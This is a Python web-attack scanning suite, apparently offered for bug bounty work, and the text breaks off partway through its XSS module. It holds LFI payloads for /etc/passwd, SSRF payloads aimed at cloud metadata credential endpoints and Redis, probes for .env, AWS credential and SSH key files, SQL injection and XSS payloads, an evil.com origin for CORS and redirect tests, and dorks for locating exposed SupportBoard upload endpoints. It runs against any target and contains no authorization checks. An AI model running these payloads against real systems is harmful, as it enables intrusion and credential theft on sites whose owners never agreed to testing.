#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FaRaSecImpossible?!!... — Bug Bounty Suite
Based on Cwlyst Team structure, fully extended.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import math
import os
import random
import re
import socket
import ssl
import subprocess
import sys
import time
import urllib.parse
from collections import Counter, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("pip install requests"); sys.exit(1)
try:
    from bs4 import BeautifulSoup
except ImportError:
    print("pip install beautifulsoup4"); sys.exit(1)
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("pip install colorama"); sys.exit(1)

VERSION  = "v1.0"
AUTHOR   = "FaRaSecImpossible?!!..."
TOOLS    = "FaRa Security Suite"
TIMEOUT  = 12
THREADS  = 30
PROXY    = os.environ.get("BOUNTY_PROXY") or None
VALID_KEY = os.environ.get("SUITE_KEY", "FARASEC")

# ═══════════════════════════════════════════════════════════
#                         BANNER
# ═══════════════════════════════════════════════════════════

BANNER_ART = f"""\
{Fore.CYAN}\
⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⢿⡶⠶⣶⣶⣴⣯⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣏⣭⣭⣽⣿⣻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠟⠁⠀⠀⢀⣀⣀⠉⠉⠚⠋⣝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡵⢿⡛⠛⠛⠉⠉⠉⠩⣼⣿⣿⣿⣿⣿
⣿⣿⣟⡋⠁⠀⢀⣴⣿⣿⣿⠋⠁⠀⠀⠀⠨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠚⠁⠀⠠⣶⣶⣦⣄⠀⠀⠙⠿⣿⣿⣿
⣿⣿⠟⠁⠀⣴⣿⣿⣿⣿⣟⠀⠣⡉⢨⠆⢐⣜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠠⡒⠤⡆⠘⣿⣿⣿⣿⣄⠀⠘⢿⣿⣿
⣍⣀⣀⣀⠀⢿⣿⣿⣿⣿⣿⣄⣀⠈⢃⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠐⠔⠃⢰⣿⣿⣿⣿⣿⠆⠀⣀⣈⣙
⣿⣿⣿⣿⣷⣶⣭⣿⣿⢿⡿⠟⣉⣩⣭⣿⣿⣿⣿⣿⣿⠀⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣒⡒⡚⠻⣿⣿⣿⣿⣵⣾⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
{Style.RESET_ALL}"""

def print_banner():
    try:
        sys.stderr.write(BANNER_ART)
        sys.stderr.write(
            f"{Fore.YELLOW}   {TOOLS} {VERSION}  |  "
            f"by {Fore.RED}{AUTHOR}{Style.RESET_ALL}\n\n")
        sys.stderr.flush()
    except (UnicodeEncodeError, OSError):
        sys.stderr.write(f"{TOOLS} {VERSION} | by {AUTHOR}\n\n")

# ═══════════════════════════════════════════════════════════
#                     STATIC DATA
# ═══════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
]

SEARXNG_INSTANCES = [
    "https://searx.be", "https://priv.au", "https://searxng.site",
    "https://search.inetol.net", "https://baresearch.org",
]

COMMON_PORTS = {
    21:"ftp",22:"ssh",23:"telnet",25:"smtp",53:"dns",80:"http",
    110:"pop3",135:"msrpc",139:"netbios",143:"imap",443:"https",
    445:"smb",993:"imaps",995:"pop3s",1433:"mssql",1521:"oracle",
    2049:"nfs",3306:"mysql",3389:"rdp",5432:"postgres",
    5900:"vnc",6379:"redis",8080:"http-alt",8443:"https-alt",
    9200:"elasticsearch",27017:"mongo",
}

SECURITY_HEADERS = [
    "Strict-Transport-Security","Content-Security-Policy",
    "X-Content-Type-Options","X-Frame-Options","X-XSS-Protection",
    "Referrer-Policy","Permissions-Policy","Cross-Origin-Opener-Policy",
    "Cross-Origin-Resource-Policy",
]

SENSITIVE_PATHS = [
    ".git/HEAD",".git/config",".git/index",".env",".env.backup",
    ".env.local",".env.production",".aws/credentials",".htpasswd",
    ".DS_Store",".svn/entries","config.php.bak","wp-config.php.bak",
    "db.sql","backup.sql","dump.sql","composer.json","package.json",
    "phpinfo.php","server-status","web.config","admin/","backup.zip",
    "backup.tar.gz","debug.log","error.log","config.yml","config.yaml",
    ".npmrc",".dockerenv","Dockerfile","docker-compose.yml",
    "id_rsa","id_rsa.pub","authorized_keys",".bash_history",
]

OPEN_REDIRECT_PARAMS = [
    "url","redirect","next","return","returnUrl","redirect_uri",
    "redirect_url","goto","dest","destination","continue","target",
    "rurl","link","out","view","to","redir","callback","back",
]

DIR_WORDLIST = [
    "admin","administrator","api","api/v1","api/v2","login","logout",
    "register","dashboard","wp-admin","wp-login.php","wp-content",
    "wp-json","uploads","upload","files","download","backup","backups",
    "db","database","config","conf","settings","test","dev","staging",
    "beta","old","static","assets","css","js","images","img","media",
    "private","public","internal","secure","auth","oauth","sso",
    "user","users","account","profile","panel","console","manage",
    "phpmyadmin","adminer","docs","swagger","swagger.json",
    "openapi.json","graphql","graphiql","health","healthcheck",
    "status","ping","version","info","debug","env","metrics",
    "robots.txt","sitemap.xml",".well-known","crossdomain.xml",
    "tmp","temp","cache","secret","secrets","tokens","cron",
    "install","setup","update","cgi-bin","xmlrpc.php",
]

TAKEOVER_FINGERPRINTS = [
    ("amazonaws.com","NoSuchBucket"),
    ("herokuapp.com","No such app"),
    ("github.io","There isn't a GitHub Pages site here"),
    ("github.com","Repository not found"),
    ("shopify.com","Sorry, this shop is currently unavailable"),
    ("fastly.net","Fastly error: unknown domain"),
    ("tumblr.com","Whatever you were looking for doesn't currently exist"),
    ("bitbucket.io","Repository not found"),
    ("wordpress.com","doesn't exist"),
    ("surge.sh","project not found"),
    ("zendesk.com","Oops, this help center no longer exists"),
    ("readme.io","Project doesnt exist"),
    ("ghost.io","The thing you were looking for is no longer here"),
    ("azurewebsites.net","404 Web Site not found"),
    ("cloudfront.net","Bad request"),
]

WAF_SIGNATURES = {
    "Cloudflare":  ["cf-ray","cloudflare","__cfduid","cf-cache-status"],
    "AWS WAF":     ["x-amzn-requestid","awselb","x-amz-cf-id"],
    "Akamai":      ["akamai","ak-bmsc","x-akamai-transformed"],
    "Imperva":     ["incap_ses","visid_incap","x-iinfo"],
    "F5 BIG-IP":   ["bigipserver","x-wa-info","f5-"],
    "Sucuri":      ["sucuri","x-sucuri-id","x-sucuri-cache"],
    "Barracuda":   ["barra_counter_session","barracuda"],
    "ModSecurity": ["mod_security","modsecurity","x-mod-security"],
    "Wordfence":   ["wordfence"],
    "Fastly":      ["x-served-by","x-fastly","fastly-io"],
    "Azure FD":    ["x-azure-ref","azurefd"],
    "CloudFront":  ["x-amz-cf-pop","x-cache: hit"],
}

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "../../../../../../../../../../etc/passwd",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1/","http://127.0.0.1:80/","http://127.0.0.1:22/",
    "http://localhost/","http://[::1]/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/INFO",
]

COMMON_PARAMS = [
    "id","page","file","url","q","search","query","cmd","exec",
    "path","dir","folder","document","view","template","theme",
    "module","section","action","do","func","function","process",
    "method","type","user","username","name","email","phone",
    "address","city","country","lang","language","locale",
    "currency","amount","price","order","item","cat","category",
    "product","sku","tag","filter","sort","limit","offset","start",
    "end","from","to","date","year","month","day","callback",
    "jsonp","ajax","format","output","api","key","token","auth",
    "session","uuid","uid","gid","pid","did","nid","cid","rid",
    "debug","test","dev","admin","root","config","settings","env",
    "source","include","require","load","read","write","data","input",
]

SUPPORTBOARD_ENDPOINTS = [
    "/wp-content/plugins/supportboard/supportboard/include/upload.php",
    "/wp-content/plugins/supportboard/include/upload.php",
]
SUPPORTBOARD_DORKS = [
    'inurl:"wp-content/plugins/supportboard/include/upload.php"',
    'inurl:"wp-content/plugins/supportboard/supportboard/include/upload.php"',
]
SUPPORTBOARD_MARKERS = [
    '"status":true','"status": true','"success":true',
    '"success": true','uploaded','uploads/sb/',
]

# ═══════════════════════════════════════════════════════════
#                     REPORT STATE
# ═══════════════════════════════════════════════════════════

REPORT: dict = {
    "target": None, "started": None, "finished": None,
    "findings": [], "artifacts": {},
}

SEV_ORDER = ["critical","high","medium","low","info"]

# ═══════════════════════════════════════════════════════════
#                       UTILITIES
# ═══════════════════════════════════════════════════════════

def log(msg, level="info"):
    prefix = {
        "info":  f"{Fore.CYAN}[*]{Style.RESET_ALL}",
        "ok":    f"{Fore.GREEN}[+]{Style.RESET_ALL}",
        "warn":  f"{Fore.YELLOW}[!]{Style.RESET_ALL}",
        "err":   f"{Fore.RED}[-]{Style.RESET_ALL}",
        "hit":   f"{Fore.MAGENTA}[★]{Style.RESET_ALL}",
        "step":  f"{Fore.BLUE}[>]{Style.RESET_ALL}",
        "crit":  f"{Fore.RED}{Style.BRIGHT}[CRIT]{Style.RESET_ALL}",
        "high":  f"{Fore.RED}[HIGH]{Style.RESET_ALL}",
        "med":   f"{Fore.YELLOW}[MED]{Style.RESET_ALL}",
        "low":   f"{Fore.CYAN}[LOW]{Style.RESET_ALL}",
    }
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"{prefix.get(level, prefix['info'])} [{ts}] {msg}")


def add_finding(severity, module, title, detail="", target=None):
    REPORT["findings"].append({
        "severity": severity, "module": module, "title": title,
        "detail": detail, "target": target or REPORT.get("target",""),
        "ts": datetime.now().isoformat(),
    })
    sev_tag = {"critical":"crit","high":"high","medium":"med",
               "low":"low","info":"info"}.get(severity,"info")
    log(f"{title} — {str(detail)[:80]}", sev_tag)


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def req_headers(extra=None):
    h = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
    }
    if extra:
        h.update(extra)
    return h


def proxies():
    return {"http": PROXY, "https": PROXY} if PROXY else None


def safe_get(url, **kwargs):
    kw = dict(headers=req_headers(), timeout=TIMEOUT, verify=False,
              allow_redirects=True, proxies=proxies())
    kw.update(kwargs)
    try:
        return requests.get(url, **kw)
    except Exception:
        return None


def save_file(name, lines):
    fn = f"{name}_{int(time.time())}.txt"
    try:
        Path(fn).write_text("\n".join(str(x) for x in lines), encoding="utf-8")
        log(f"Saved: {fn}", "ok")
        return fn
    except Exception as e:
        log(f"Save error: {e}", "err")
        return None


def norm_target(raw):
    raw = raw.strip()
    if not raw.startswith(("http://","https://")):
        raw = "https://" + raw
    p = urllib.parse.urlparse(raw)
    return p.scheme, p.netloc or p.path.split("/")[0], raw


def clean_host(raw):
    raw = raw.strip().lower()
    raw = re.sub(r"^https?://", "", raw)
    return raw.split("/")[0].split(":")[0].split("?")[0]


def ask(prompt):
    try:
        return input(f"    {Fore.CYAN}[?]{Style.RESET_ALL} {prompt}: ").strip()
    except (KeyboardInterrupt, EOFError):
        return ""


# ═══════════════════════════════════════════════════════════
#                         LOGIN
# ═══════════════════════════════════════════════════════════

def login():
    clear(); print_banner()
    print(f"{Fore.YELLOW}        ╭━━━【 LOGIN REQUIRED 】━━━╮")
    print(f"        ╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯{Style.RESET_ALL}\n")
    for i in range(3):
        key = ask("Access Key")
        if not key:
            sys.exit(0)
        if key == VALID_KEY:
            print(f"    {Fore.GREEN}[+]{Style.RESET_ALL} Login berhasil!")
            time.sleep(0.4)
            return
        print(f"    {Fore.RED}[-]{Style.RESET_ALL} Key salah! Sisa: {2-i}")
    sys.exit(1)

# ═══════════════════════════════════════════════════════════
#                     SEARCH ENGINES
# ═══════════════════════════════════════════════════════════

def _ddg(q, n=50):
    out = []
    try:
        r = requests.get("https://html.duckduckgo.com/html/", params={"q": q},
                         headers=req_headers(), timeout=TIMEOUT, verify=False,
                         proxies=proxies())
        soup = BeautifulSoup(r.text, "html.parser")
        for item in soup.select(".result__body"):
            a = item.select_one(".result__a")
            if not a: continue
            link = a.get("href","")
            if "uddg=" in link:
                try:
                    link = urllib.parse.parse_qs(
                        urllib.parse.urlparse(link).query).get("uddg",[""])[0]
                except Exception: pass
            if link.startswith("http"):
                sn = item.select_one(".result__snippet")
                out.append({"title":a.get_text(strip=True),"url":link,
                            "engine":"ddg","snippet":sn.get_text(strip=True) if sn else ""})
            if len(out) >= n: break
    except Exception as e:
        log(f"DDG: {e}", "warn")
    return out


def _bing(q, n=50):
    out = []
    try:
        h = req_headers({"Cookie":"SRCHHPGUSR=SRCHLANG=en"})
        for off in range(0, n, 10):
            r = requests.get("https://www.bing.com/search",
                             params={"q":q,"first":off+1,"count":10},
                             headers=h, timeout=TIMEOUT, verify=False, proxies=proxies())
            soup = BeautifulSoup(r.text, "html.parser")
            page_hits = 0
            for li in soup.select("li.b_algo"):
                a = li.select_one("h2 a")
                if not a: continue
                link = a.get("href","")
                if link.startswith("http"):
                    sn = li.select_one(".b_caption p")
                    out.append({"title":a.get_text(strip=True),"url":link,
                                "engine":"bing","snippet":sn.get_text(strip=True) if sn else ""})
                    page_hits += 1
            if not page_hits: break
            time.sleep(0.3)
    except Exception as e:
        log(f"Bing: {e}", "warn")
    return out


def _searx(q, n=50):
    out = []
    for inst in SEARXNG_INSTANCES:
        try:
            r = requests.get(f"{inst}/search",
                             params={"q":q,"format":"json","language":"en","safesearch":0},
                             headers=req_headers(), timeout=12, verify=False, proxies=proxies())
            if r.status_code != 200: continue
            for item in r.json().get("results",[])[:n]:
                if item.get("url","").startswith("http"):
                    out.append({"title":item.get("title",""),"url":item["url"],
                                "engine":"searx","snippet":item.get("content","")})
            if out: log(f"SearXNG OK via {inst}", "ok"); break
        except Exception: continue
    return out


def dedupe_rs(rs):
    seen, u = set(), []
    for r in rs:
        k = r.get("url","").split("?")[0].rstrip("/")
        if k and k not in seen:
            seen.add(k); u.append(r)
    return u

# ═══════════════════════════════════════════════════════════
#                     MODULES 1–21 (original)
# ═══════════════════════════════════════════════════════════

def mod_dork():
    clear(); print_banner()
    print(f"\n{Fore.YELLOW}  CONTOH:{Style.RESET_ALL}")
    for ex in ['inurl:admin','intitle:"index of"','ext:sql password',
               'site:target.com inurl:login','inurl:.env',
               'inurl:"wp-content/plugins/supportboard/include/upload.php"']:
        print(f"  {Fore.CYAN}{ex}{Style.RESET_ALL}")
    q = ask("Query")
    if len(q) < 3: log("Query terlalu pendek","err"); return
    log(f"Query: {q}","hit")
    allr = []
    for label, fn in [("DDG",_ddg),("Bing",_bing),("SearXNG",_searx)]:
        log(f"Cari via {label}...","step")
        r = fn(q); allr.extend(r)
        log(f"  {label}: {len(r)} hasil","info")
    allr = dedupe_rs(allr)
    print(f"\n{Fore.YELLOW}{'='*70}\n  {len(allr)} UNIQUE URL\n{'='*70}{Style.RESET_ALL}")
    for i, r in enumerate(allr,1):
        print(f"\n  {Fore.CYAN}[{i}]{Style.RESET_ALL} {r['title'][:70]}")
        print(f"      {Fore.GREEN}{r['url']}{Style.RESET_ALL}")
        print(f"      {Fore.MAGENTA}[{r['engine']}]{Style.RESET_ALL}")
    if allr:
        save_file("dork",[f"[{i}] {r['title']}\n    {r['url']}" for i,r in enumerate(allr,1)])
        REPORT["artifacts"]["dork"] = allr


def _enum_subs(dom):
    found = set()
    for url, key in [
        (f"https://crt.sh/?q=%25.{dom}&output=json","crt.sh"),
        (f"https://api.hackertarget.com/hostsearch/?q={dom}","hackertarget"),
    ]:
        try:
            r = requests.get(url, headers=req_headers(), timeout=30,
                             verify=False, proxies=proxies())
            if r.status_code != 200: continue
            if key == "crt.sh":
                for e in r.json():
                    for n in e.get("name_value","").split("\n"):
                        n = n.strip().lower().lstrip("*.")
                        if n.endswith(dom) and n: found.add(n)
            else:
                if "error" not in r.text.lower():
                    for line in r.text.splitlines():
                        if "," in line:
                            h = line.split(",")[0].strip().lower()
                            if h.endswith(dom): found.add(h)
            log(f"{key}: {len(found)} total","info")
        except Exception as e:
            log(f"{key}: {e}","warn")
    # bonus: subfinder-style brute via DNSX (if online)
    try:
        r2 = requests.get(
            f"https://api.hackertarget.com/dnslookup/?q={dom}",
            headers=req_headers(), timeout=15, verify=False, proxies=proxies())
        if r2.status_code == 200 and "error" not in r2.text.lower():
            for line in r2.text.splitlines():
                h = line.strip().lower()
                if h.endswith(dom) and h: found.add(h)
    except Exception: pass
    return found


def _resolve(host):
    try: return host, socket.gethostbyname(host)
    except Exception: return host, None


def mod_subdomain():
    clear(); print_banner()
    dom = clean_host(ask("Domain"))
    if not dom: return
    log(f"Enumerating: {dom}","step")
    found = _enum_subs(dom)
    if not found: log("Tidak ada hasil","warn"); return
    log("Resolving...","step")
    resolved = []
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for h, ip in ex.map(_resolve, sorted(found)):
            if ip:
                resolved.append((h,ip))
                print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} {h:<50} {Fore.CYAN}{ip}{Style.RESET_ALL}")
    log(f"Live: {len(resolved)}/{len(found)}","ok")
    REPORT["artifacts"]["subdomains"] = resolved
    if resolved:
        save_file(f"subs_{dom}",[f"{h}\t{ip}" for h,ip in resolved])


def _probe_port(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1.5)
    try:
        if s.connect_ex((host, port)) == 0:
            try: s.settimeout(2); banner = s.recv(100).decode(errors="ignore").strip()[:60]
            except Exception: banner = ""
            return port, banner
    except Exception: pass
    finally: s.close()
    return None


def mod_portscan():
    clear(); print_banner()
    target = ask("Host/IP")
    if not target: return
    log(f"Port scan: {target}","step")
    open_ports = []
    with ThreadPoolExecutor(max_workers=50) as ex:
        for res in ex.map(lambda p: _probe_port(target,p), COMMON_PORTS.keys()):
            if res:
                port, banner = res; open_ports.append(port)
                svc = COMMON_PORTS.get(port,"?")
                print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} {port:<6} {svc:<15} {banner}")
                if port in (3306,5432,27017,6379,9200,21,23):
                    add_finding("high","portscan",f"Dangerous port: {port} ({svc})",
                                f"{target}:{port}", target)
    log(f"Open: {len(open_ports)}","ok")
    REPORT["artifacts"]["ports"] = open_ports
    if open_ports:
        save_file(f"ports_{target}",[f"{p}\t{COMMON_PORTS.get(p,'?')}" for p in open_ports])


def mod_headers():
    clear(); print_banner()
    url = ask("URL")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    log(f"Analyzing: {url}","step")
    r = safe_get(url)
    if not r: log("Failed","err"); return
    print(f"\n  {Fore.CYAN}Status:{Style.RESET_ALL} {r.status_code}  "
          f"{Fore.CYAN}Server:{Style.RESET_ALL} {r.headers.get('Server','N/A')}\n")
    hdrs_lower = {k.lower():v for k,v in r.headers.items()}
    missing = []
    for h in SECURITY_HEADERS:
        if h.lower() in hdrs_lower:
            print(f"  {Fore.GREEN}[✓]{Style.RESET_ALL} {h}")
        else:
            missing.append(h)
            print(f"  {Fore.RED}[✗]{Style.RESET_ALL} {h}")
    if missing:
        add_finding("low","headers",f"Missing {len(missing)} security headers",
                    ", ".join(missing), url)
    print(f"\n  {Fore.YELLOW}─ Cookies ─{Style.RESET_ALL}")
    for c in r.cookies:
        flags = []
        if c.secure: flags.append("Secure")
        if c.has_nonstandard_attr("HttpOnly"): flags.append("HttpOnly")
        if c.has_nonstandard_attr("SameSite"): flags.append("SameSite")
        print(f"  {Fore.CYAN}{c.name}{Style.RESET_ALL} → {', '.join(flags) or Fore.RED+'NO FLAGS'+Style.RESET_ALL}")


def mod_cors():
    clear(); print_banner()
    url = ask("URL")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    log(f"CORS: {url}","step")
    netloc = urllib.parse.urlparse(url).netloc
    for label, origin in [("arbitrary","https://evil.com"),("null","null"),
                           ("subdomain-trick",f"https://{netloc}.evil.com")]:
        try:
            r = requests.get(url, headers=req_headers({"Origin":origin}),
                             timeout=TIMEOUT, verify=False, proxies=proxies())
            acao = r.headers.get("Access-Control-Allow-Origin","")
            acac = r.headers.get("Access-Control-Allow-Credentials","").lower()
            if acao == origin and acac == "true":
                print(f"  {Fore.RED}[VULN]{Style.RESET_ALL} {label}: ACAO={acao} ACAC={acac}")
                add_finding("high","cors",f"CORS misconfig ({label})",
                            f"ACAO={acao}, ACAC={acac}", url)
            elif acao == "*":
                print(f"  {Fore.YELLOW}[WILD]{Style.RESET_ALL} {label}: ACAO=*")
            else:
                print(f"  {Fore.GREEN}[safe]{Style.RESET_ALL} {label}: ACAO={acao or 'none'}")
        except Exception: pass


def mod_openredirect():
    clear(); print_banner()
    url = ask("URL")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    p = urllib.parse.urlparse(url)
    base = f"{p.scheme}://{p.netloc}{p.path}"
    qs = urllib.parse.parse_qs(p.query) or {}
    log(f"Open redirect: {base}","step")
    payload = "https://evil.com"
    hits = 0
    for param in OPEN_REDIRECT_PARAMS:
        nq = qs.copy(); nq[param] = [payload]
        test = f"{base}?{urllib.parse.urlencode(nq, doseq=True)}"
        try:
            r = requests.get(test, headers=req_headers(), timeout=TIMEOUT,
                             verify=False, allow_redirects=False, proxies=proxies())
            loc = r.headers.get("Location","")
            if r.status_code in (301,302,303,307,308) and "evil.com" in loc:
                print(f"  {Fore.RED}[VULN]{Style.RESET_ALL} param={param} → {loc}")
                add_finding("medium","redirect",f"Open redirect via '{param}'", test, url)
                hits += 1
        except Exception: pass
    log(f"Hits: {hits}", "ok" if hits else "info")


def mod_wayback():
    clear(); print_banner()
    dom = clean_host(ask("Domain"))
    if not dom: return
    log(f"Wayback: {dom}","step")
    try:
        r = requests.get("http://web.archive.org/cdx/search/cdx",
                         params={"url":f"{dom}/*","output":"json","collapse":"urlkey",
                                 "limit":"8000","fl":"original"},
                         headers=req_headers(), timeout=60, verify=False, proxies=proxies())
        data = r.json()
        urls = [row[0] for row in data[1:]] if len(data) > 1 else []
    except Exception as e:
        log(f"Error: {e}","err"); return
    log(f"{len(urls)} URLs","ok")
    params, files, js = set(), set(), set()
    for u in urls:
        pu = urllib.parse.urlparse(u)
        if pu.query:
            for k in urllib.parse.parse_qs(pu.query).keys(): params.add(k)
        ext = os.path.splitext(pu.path)[1].lower()
        if ext in (".php",".asp",".aspx",".jsp",".bak",".zip",".sql",
                   ".env",".json",".xml",".log",".config"):
            files.add(u)
        if ext == ".js": js.add(u)
    print(f"\n  {Fore.YELLOW}─ Params ({len(params)}) ─{Style.RESET_ALL}")
    for p in sorted(params)[:40]: print(f"  {Fore.GREEN}{p}{Style.RESET_ALL}")
    print(f"\n  {Fore.YELLOW}─ Files ({len(files)}) ─{Style.RESET_ALL}")
    for u in list(files)[:20]: print(f"  {Fore.CYAN}{u}{Style.RESET_ALL}")
    REPORT["artifacts"]["wayback"] = {"params":list(params),"files":list(files)}
    save_file(f"wayback_{dom}", urls)


def mod_sensitive():
    clear(); print_banner()
    url = ask("URL")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    base = url.rstrip("/")
    log(f"Sensitive paths: {base}","step")
    def probe(path):
        try:
            r = requests.get(f"{base}/{path}", headers=req_headers(),
                             timeout=8, verify=False, allow_redirects=False,
                             proxies=proxies())
            if r.status_code == 200 and len(r.content) > 10:
                return path, r.status_code, len(r.content), r.text[:150]
        except Exception: pass
        return None
    found = []
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for res in ex.map(probe, SENSITIVE_PATHS):
            if res:
                path, code, size, preview = res; found.append((path,code,size))
                print(f"  {Fore.RED}[HIT]{Style.RESET_ALL} /{path:<30} [{code}] {size}b")
                sev = "critical" if any(k in path for k in
                    [".env",".git","config",".aws","phpinfo","backup",".sql","id_rsa"]) else "medium"
                add_finding(sev,"sensitive",f"Exposed: /{path}",f"{code}, {size}b", url)
    log(f"Found {len(found)}","ok" if found else "info")
    REPORT["artifacts"]["sensitive"] = found


def mod_fingerprint():
    clear(); print_banner()
    url = ask("URL")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    log(f"Fingerprint: {url}","step")
    r = safe_get(url)
    if not r: log("Failed","err"); return
    body = r.text.lower()
    hdrs = {k.lower():v for k,v in r.headers.items()}
    combined = body + "\n" + "\n".join(f"{k}: {v}" for k,v in hdrs.items())
    sigs = {
        "WordPress":["wp-content","wp-includes"],
        "Joomla":["joomla","/media/system/"],
        "Drupal":["drupal","sites/default"],
        "Laravel":["laravel_session","csrf-token"],
        "Django":["csrftoken","django"],
        "Ruby on Rails":["rails","_session_id"],
        "ASP.NET":["__viewstate","asp.net"],
        "PHP":["phpsessid","x-powered-by: php"],
        "Nginx":["server: nginx"],
        "Apache":["server: apache"],
        "Cloudflare":["cf-ray","cloudflare"],
        "React":["__react","react-dom"],
        "Vue":["vue.js","vue-router"],
        "Angular":["ng-version","angular"],
        "jQuery":["jquery"],
        "Bootstrap":["bootstrap.min.css"],
        "Next.js":["__next","_next/"],
        "GraphQL":["graphql","/graphiql"],
        "Swagger":["swagger-ui","swagger.json"],
    }
    detected = [t for t,needles in sigs.items() if any(n in combined for n in needles)]
    print(f"\n  {Fore.YELLOW}─ Tech Detected ─{Style.RESET_ALL}")
    for t in detected or ["(unknown)"]:
        print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} {t}")
    print(f"\n  Status: {r.status_code} | Size: {len(r.content)}b")
    print(f"  Server: {hdrs.get('server','?')} | Powered-By: {hdrs.get('x-powered-by','?')}")
    endpoints = set(re.findall(
        r'["\'](/(?:api|v\d|admin|internal|graphql|rest)[/\w\-\.]*)["\']', r.text))
    if endpoints:
        print(f"\n  {Fore.YELLOW}─ Endpoints ─{Style.RESET_ALL}")
        for ep in list(endpoints)[:20]:
            print(f"  {Fore.CYAN}{ep}{Style.RESET_ALL}")
    REPORT["artifacts"]["fingerprint"] = {"tech":detected,"endpoints":list(endpoints)}


def mod_sqli():
    clear(); print_banner()
    url = ask("URL dengan param")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    p = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(p.query)
    if not qs: log("URL tanpa parameter","err"); return
    log(f"SQLi: {url}","step")
    param = list(qs.keys())[0]; orig = qs[param][0]
    def fetch(val):
        nq = qs.copy(); nq[param] = [val]
        nu = urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(nq,doseq=True)))
        r = safe_get(nu)
        return (r.status_code, len(r.content), r.text) if r else (None,0,"")
    base_code, base_len, _ = fetch(orig)
    if not base_code: log("Baseline fail","err"); return
    log(f"Baseline: {base_code} {base_len}b","info")
    pairs = [
        (f"{orig}' AND '1'='1", f"{orig}' AND '1'='2"),
        (f"{orig}' AND 1=1-- -", f"{orig}' AND 1=2-- -"),
        (f"{orig}\" AND \"1\"=\"1", f"{orig}\" AND \"1\"=\"2"),
    ]
    hits = 0
    for t_pay, f_pay in pairs:
        tc,tl,_ = fetch(t_pay); fc,fl,_ = fetch(f_pay)
        if tc == base_code and abs(tl-fl) > 20:
            print(f"  {Fore.RED}[BOOLEAN]{Style.RESET_ALL} TRUE={tl}b FALSE={fl}b diff={abs(tl-fl)}b")
            add_finding("high","sqli",f"Boolean SQLi suspect on '{param}'",
                        f"true={tl}, false={fl}", url); hits += 1
    err_sigs = ["sql syntax","mysql_fetch","ora-0","postgresql","syntax error",
                "you have an error in your sql","warning: mysql","microsoft ole db"]
    for ep in [f"{orig}'", f"{orig}\"", f"{orig});--"]:
        _,_,body = fetch(ep)
        if any(s in body.lower() for s in err_sigs):
            print(f"  {Fore.RED}[ERROR]{Style.RESET_ALL} payload={ep!r}")
            add_finding("critical","sqli",f"Error-based SQLi on '{param}'",
                        f"payload={ep!r}", url); hits += 1
    log(f"Signals: {hits}","ok" if hits else "info")


def mod_xss():
    clear(); print_banner()
    url = ask("URL dengan param")
    if not url: return
    if not url.startswith("http"): url = "https://" + url
    p = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(p.query)
    if not qs: log("Butuh parameter","err"); return
    log(f"XSS: {url}","step")
    payloads = [
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "'><svg onload=alert(1)>",
